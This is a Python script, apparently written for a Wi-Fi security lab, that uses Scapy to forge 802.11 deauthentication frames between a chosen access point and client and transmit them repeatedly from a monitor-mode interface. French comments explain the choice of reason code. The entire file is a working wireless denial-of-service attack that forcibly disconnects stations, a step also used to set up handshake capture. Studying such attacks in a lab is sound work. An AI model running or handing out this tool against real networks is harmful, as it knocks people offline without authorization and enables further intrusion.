import argparse

from scapy.all import *
from scapy.layers.dot11 import Dot11, RadioTap, Dot11Deauth

parser = argparse.ArgumentParser()
parser.add_argument('-i', '--interface', required=True, help='The interface from which to send the packets.')
parser.add_argument('--bssid', required=True, metavar='MAC_ADDR', help='MAC address of the AP to be targeted.')
parser.add_argument('--sta', required=True, metavar='MAC_ADDR',
                    help='MAC address of the station to be disassociated from the AP.')
parser.add_argument('-c', '--deauth-count', required=True, type=int, metavar='COUNT',
                    help='Number of deauthentication packets to send.')
parser.add_argument('-r', '--reason', required=True, type=int, metavar='CODE', choices=[1, 4, 5, 8],
                    help='Reason code to use of the packets, one of 1, 4, 5 and 8.')
args = parser.parse_args()

# Ici on définit le sens des reason codes selon ce qui est choisi par l'utilisateur

# Le 1 pourrait aller dans les 2 sens selon nos recherches mais ce sens fonctionne très bien
if args.reason in (1, 4, 5):
    src = args.bssid
    dst = args.sta
elif args.reason == 8:
    src = args.sta
    dst = args.bssid

# On construit notre paquet de Deauth
dot11 = Dot11(type=0, subtype=12, addr1=dst, addr2=src, addr3=args.bssid)
packet = RadioTap() / dot11 / Dot11Deauth(reason=args.reason)
packet.show()

# On envoit le paquet n fois (demandé à l'utilisateur)
sendp(packet, iface=args.interface, inter=0.1, count=args.deauth_count, monitor=True)
